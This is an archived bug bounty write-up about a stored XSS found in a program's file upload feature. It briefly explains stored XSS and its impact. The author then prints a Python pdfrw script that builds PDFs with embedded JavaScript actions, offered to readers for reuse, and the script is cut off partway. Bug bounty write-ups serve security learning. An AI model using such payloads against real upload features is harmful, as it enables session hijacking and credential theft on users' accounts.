# Day 14 Bug Bounty Challenge — Found $1000 Stored XSS

- **Source URL:** https://medium.com/@avbhijitdutta99/day-14-bug-bounty-challenge-found-1000-stored-xss-c0c9813bbe5a?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240219020307/https://medium.com/@avbhijitdutta99/day-14-bug-bounty-challenge-found-1000-stored-xss-c0c9813bbe5a?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5331 (id 5331)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Day 14 Bug Bounty Challenge — Found $1000 Stored XSS

--

Hi there! It’s cyberbeat again, I was having a hard time getting back to the challenge, but I did it. I will post my results continuously now and won’t disappoint all again. Let’s get down to the main thing.

Let’s get down to basics first, **what is Stored XSS**?

Stored Cross Site Scripting (or XSS) is one of the vulnerability in web application where the attacker stores malicious payload in the system and execute when clicked or the page is loaded.


# Why should anyone care about **XSS**?

The attacker can perform the following malicious actions —

- Steal User credentials
- Obtain sensitive information of the user
- Website defacement
- Hijack the victim’s session and perform actions on their behalf
- Port scanning of the host connected.

Let’s get down to the main story. So I was trying to find bugs for the program and the program had file upload functionality. I wanted to check if there are any vulnerability in that functionality.

So I logged in and was using random payloads for the attack. The following payload worked. You can use for your own use too.

```
import sys
from pdfrw import PdfWriter
from pdfrw.objects.pdfname import PdfName
from pdfrw.objects.pdfstring import PdfString
from pdfrw.objects.pdfdict import PdfDict
from pdfrw.objects.pdfarray import PdfArray
def make_js_action(js):
 action = PdfDict()
 action.S = PdfName.JavaScript
 action.JS = js
 return action
def make_field(name, x, y, width, height, r, g, b, value=""):
 annot = PdfDict()
 annot.Type = PdfName.Annot
 annot.Subtype = PdfName.Widget
 annot.FT = PdfName.Tx
 annot.Ff = 2
 annot.Rect = PdfArray([x, y, x + width, y + height])
 annot.MaxLen = 160
 annot.T = PdfString.encode(name)
 annot.V = PdfString.encode(value)
# Default appearance stream can be arbitrary PDF XObject 
 annot.AP = PdfDict()
ap = annot.AP.N = PdfDict()…
```
